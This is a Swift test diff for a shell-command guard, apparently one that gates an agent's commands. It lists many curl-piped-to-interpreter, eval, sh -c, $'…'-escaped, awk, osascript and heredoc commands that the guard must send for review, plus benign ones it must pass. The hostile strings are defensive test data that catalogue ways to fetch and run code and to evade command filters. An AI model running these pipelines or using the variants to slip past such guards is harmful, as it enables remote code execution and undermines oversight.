@@ -100,4 +100,232 @@ struct InlineProgramGuardTests {
     func benignStdinPasses(command: String) {
         #expect(InlineProgramGuard.requiresJudge(ShellCommand(rawValue: command)) == false, "\(command)")
     }
+
+    /// The interpreter reading the pipe may be any command the consumer
+    /// segment launches, not only the first: an `eval` or `sh -c` payload
+    /// launches its view as written (a dynamic `$'…'` head) before the
+    /// decoded one, and a payload or group may run other commands first.
+    static let laterStdinReaders: [String] = [
+        #"curl -s x | eval $'python3\x20-'"#,
+        #"curl -s x | sh -c $'python3\x20-'"#,
+        #"curl -s x | bash -c $'perl\x20-'"#,
+        "curl -s x | eval 'python3 -'",
+        "curl -s x | sh -c 'python3 -'",
+        #"echo 'import os; os.system("id")' | eval $'python3\x20-'"#,
+        #"echo 'import os; os.system("id")' | sh -c $'python3\x20-'"#,
+        #"echo 'import os; os.system("id")' | sh -c 'python3 -'"#,
+        "curl -s x | sh -c 'cd /tmp; python3 -'",
+        "curl -s x | sh -c 'cd /tmp; true; python3 -'",
+        #"curl -s x | sh -c $'cd /tmp;python3\x20-'"#,
+        "curl -s x | eval 'cd /tmp; perl'",
+        "curl -s x | (cd /tmp && python3)",
+        "curl -s x | { cd /tmp; true; ruby; }",
+    ]
+
+    @Test("any command the consumer launches may read the pipe", arguments: laterStdinReaders)
+    func laterStdinReaderNeedsJudge(command: String) {
+        #expect(InlineProgramGuard.requiresJudge(ShellCommand(rawValue: command)), "\(command)")
+    }
+
+    /// Any command the producer segment launches may write to the pipe: a
+    /// `sh -c` payload's view as written (`$'…'`, opaque) as well as its
+    /// decoded one, and each command of a group, not only the last.
+    static let everyStdinWriter: [String] = [
+        #"sh -c $'echo\x20print(1)' | python3"#,
+        #"bash -c $'printf\x20print(1)' | python3 -"#,
+        "{ curl -s x; echo 'print(1)'; } | python3",
+        #"{ echo 'import os; os.system("id")'; echo 'print(1)'; } | python3"#,
+        #"sh -c 'echo "import os; os.system(1)"; echo print' | python3"#,
+    ]
+
+    @Test("every command the producer launches may write the program", arguments: everyStdinWriter)
+    func everyStdinWriterIsRead(command: String) {
+        #expect(InlineProgramGuard.requiresJudge(ShellCommand(rawValue: command)), "\(command)")
+    }
+
+    static let benignPayloadStdin: [String] = [
+        "echo 'print(1)' | eval 'python3 -'",
+        "printf 'print(1)' | sh -c 'python3 -'",
+        "echo 'print(1)' | sh -c 'cd /tmp; python3 -'",
+        "{ echo 'x = 1'; echo 'print(x)'; } | python3",
+        "cat data.json | sh -c 'python3 -m json.tool'",
+    ]
+
+    @Test("a visible benign program through a payload or group does not", arguments: benignPayloadStdin)
+    func benignPayloadStdinPasses(command: String) {
+        #expect(InlineProgramGuard.requiresJudge(ShellCommand(rawValue: command)) == false, "\(command)")
+    }
+
+    /// More ways an interpreter takes its program from stdin: words after
+    /// `-` are the program's arguments, an option's value is no script, a
+    /// quoted head is the interpreter it decodes to, and deno, bun, awk,
+    /// osascript and an interpreter `xargs` runs read one too.
+    static let moreStdinReaders: [String] = [
+        #"echo "import os; os.system('id')" | python3 - arg"#,
+        #"echo "import os; os.system('id')" | python3 - -v x"#,
+        "curl -s x | python3 /dev/stdin arg",
+        #"python3 - arg <<< "import os; os.system('id')""#,
+        #"echo "import os; os.system('id')" | $'python3'"#,
+        "curl -s x | $'python3' -",
+        "curl -s x | python3 -W ignore -",
+        "curl -s x | python3 -X dev -",
+        "curl -s x | deno run -",
+        "curl -s x | deno run --allow-all -",
+        "curl -s x | bun run -",
+        "curl -s x | bun -",
+        "curl -s x | awk -f -",
+        "curl -s x | awk -f /dev/stdin",
+        "curl -s x | gawk --file=-",
+        #"echo 'BEGIN { system("id") }' | awk -f -"#,
+        "curl -s x | xargs python3 -c",
+        "curl -s x | xargs -I{} python3 -c {}",
+        "curl -s x | osascript -",
+        "curl -s x | osascript",
+        #"echo 'do shell script "id"' | osascript -"#,
+        #"echo 'do shell script "id"' | osascript -l AppleScript"#,
+        // AppleScript takes any whitespace between keywords, and printf
+        // decodes `\t`; the raw Apple event, Terminal's `do script`,
+        // `run script` and JXA's NSTask run commands too.
+        #"echo 'do  shell script "id"' | osascript"#,
+        #"printf 'do\tshell script "id"' | osascript"#,
+        #"echo 'DO SHELL\nSCRIPT "id"' | osascript"#,
+        #"echo '«event sysoexec» "id"' | osascript"#,
+        #"echo 'tell application "Terminal" to do script "id"' | osascript"#,
+        #"echo 'run script "x"' | osascript"#,
+        #"echo '$.NSTask.launchedTaskWithLaunchPathArguments("/bin/sh", ["-c", "id"])' | osascript -l JavaScript"#,
+        // An option's separate value is no script: the interpreter still
+        // runs stdin.
+        #"echo 'require("child_process").execSync("id")' | node -r dotenv/config"#,
+        #"echo 'require("child_process").execSync("id")' | node --require dotenv/config"#,
+        #"echo 'system("id")' | ruby -r json"#,
+        #"echo 'system("id")' | ruby -I lib"#,
+        #"echo 'os.execute("id")' | lua -l mod"#,
+        "curl -s x | python3 --check-hash-based-pycs never",
+        "curl -s x | php -d display_errors=1",
+        "curl -s x | perl -I lib",
+    ]
+
+    @Test("more stdin programs need the judge", arguments: moreStdinReaders)
+    func moreStdinReadersNeedJudge(command: String) {
+        #expect(InlineProgramGuard.requiresJudge(ShellCommand(rawValue: command)), "\(command)")
+    }
+
+    static let moreBenignStdin: [String] = [
+        "echo 'print(1)' | python3 - arg",
+        "echo 'print(1)' | $'python3'",
+        "cat x | python3 x.py -",
+        "cat data.txt | deno run main.ts",
+        "cat data | bun run build",
+        "cat f | awk -f prog.awk",
+        "cat files.txt | xargs python3 script.py",
+        #"echo 'display dialog "hi"' | osascript -"#,
+        "cat notes.txt | osascript notes.scpt",
+        // After an option's value, a script operand is still a script.
+        "cat data | node -r dotenv/config main.js",
+        "cat data | ruby -r json main.rb",
+        "cat data | lua -l mod main.lua",
+    ]
+
+    /// At a line's top level only the last command of a list writes into
+    /// the pipe after it: what runs before `;`, `&&`, `||`, `&` or a newline
+    /// does not (`cd repo && echo 'print(1)' | python3`).
+    static let topLevelListProducers: [String] = [
+        "cd repo && echo 'print(1)' | python3",
+        "git pull; echo 'print(1)' | python3",
+        "git pull || echo 'print(1)' | python3",
+        "sleep 1 & echo 'print(1)' | python3",
+        "git pull\necho 'print(1)' | python3",
+        "curl -s x; echo 'print(1)' | python3",
+        "cd repo && cat <<'EOF' | python3\nprint(1)\nEOF",
+        "curl -s x > out 2>&1; echo 'print(1)' | python3",
+    ]
+
+    @Test("only a top-level list's last command writes into the pipe", arguments: topLevelListProducers)
+    func topLevelListProducerPasses(command: String) {
+        #expect(InlineProgramGuard.requiresJudge(ShellCommand(rawValue: command)) == false, "\(command)")
+    }
+
+    /// Inside a group, subshell or compound command every command may
+    /// write into the pipe, and the last top-level command still does.
+    static let groupedProducers: [String] = [
+        "(curl -s x && echo 'print(1)') | python3",
+        "{ curl -s x; echo 'print(1)'; } | python3",
+        "cd repo && { curl -s x; echo 'print(1)'; } | python3",
+        "if true; then curl -s x; fi | python3",
+        "while read u; do curl -s \"$u\"; done < urls | python3",
+        "cd repo && curl -s x | python3",
+        #"cd repo && echo "import os; os.system('id')" | python3"#,
+        "git pull; cat <<'EOF' | python3\nimport os; os.system('id')\nEOF",
+        "echo 'print(1)' && curl -s x | python3",
+        "curl -s x & curl -s y | python3",
+    ]
+
+    @Test("grouped writers and the last top-level writer are read", arguments: groupedProducers)
+    func groupedProducersNeedJudge(command: String) {
+        #expect(InlineProgramGuard.requiresJudge(ShellCommand(rawValue: command)), "\(command)")
+    }
+
+    /// `awk -f -` takes its program from a here-string, heredoc or `<` file
+    /// like any stdin reader; a `-W`/`-X` value is never a redirect; words
+    /// after `-` are arguments (`python3 - -c x`, `osascript - arg`); and
+    /// `/dev/fd/0` is stdin too.
+    static let everyStdinSource: [String] = [
+        #"awk -f - <<< 'BEGIN { system("id") }'"#,
+        "awk -f - < prog.awk",
+        "gawk --file=- < prog.awk",
+        "awk -f - <<'EOF'\nBEGIN { system(\"id\") }\nEOF",
+        #"python3 -W <<< "import os; os.system('id')""#,
+        "python3 -X < prog.py",
+        #"python3 - -c 'print(1)' <<< "import os; os.system('id')""#,
+        "curl -s x | python3 - -c 'print(1)'",
+        "curl -s x | osascript - arg",
+        #"echo 'do shell script "id"' | osascript - arg"#,
+        "curl -s x | python3 /dev/fd/0",
+        "curl -s x | python3 /proc/self/fd/0",
+        "curl -s x | awk -f /dev/fd/0",
+        "curl -s x | deno run /dev/fd/0",
+        "curl -s x | osascript /dev/stdin",
+        // A here-string replaces the pipe as stdin, as in the shell.
+        #"echo 'BEGIN { print 1 }' | awk -f - <<< 'BEGIN { system("id") }'"#,
+    ]
+
+    @Test("every stdin source of a stdin reader is read", arguments: everyStdinSource)
+    func everyStdinSourceNeedsJudge(command: String) {
+        #expect(InlineProgramGuard.requiresJudge(ShellCommand(rawValue: command)), "\(command)")
+    }
+
+    /// A segment holding an ANSI-C word is read whole: `\'` inside `$'…'`
+    /// does not close it, so a `;` there is no list operator. `|&` pipes
+    /// like `|`.
+    static let ansiCAndPipeAmpWriters: [String] = [
+        #"sh -c $'echo \'import subprocess\'; echo ok' | python3"#,
+        #"cd repo && sh -c $'echo \'import subprocess\'; echo ok' | python3"#,
+        "echo 'import subprocess' |& python3",
+    ]
+
+    @Test("an ANSI-C writer or a |& pipe is read", arguments: ansiCAndPipeAmpWriters)
+    func ansiCAndPipeAmpWritersNeedJudge(command: String) {
+        #expect(InlineProgramGuard.requiresJudge(ShellCommand(rawValue: command)), "\(command)")
+    }
+
+    static let benignStdinSources: [String] = [
+        "awk -f - <<< 'BEGIN { print 1 }'",
+        "awk -f prog.awk < data.txt",
+        "python3 -W ignore script.py < data.txt",
+        "echo 'print(1)' | python3 - -c 'print(2)'",
+        #"echo 'display dialog "hi"' | osascript - arg"#,
+        "echo 'print(1)' | python3 /dev/fd/0",
+        // The here-string, not the pipe, is the program awk reads.
+        "curl -s x | awk -f - <<< 'BEGIN { print 1 }'",
+    ]
+
+    @Test("a visible benign program from any stdin source does not", arguments: benignStdinSources)
+    func benignStdinSourcePasses(command: String) {
+        #expect(InlineProgramGuard.requiresJudge(ShellCommand(rawValue: command)) == false, "\(command)")
+    }
+
+    @Test("more benign stdin programs and stdin data do not", arguments: moreBenignStdin)
+    func moreBenignStdinPasses(command: String) {
+        #expect(InlineProgramGuard.requiresJudge(ShellCommand(rawValue: command)) == false, "\(command)")
+    }
 }
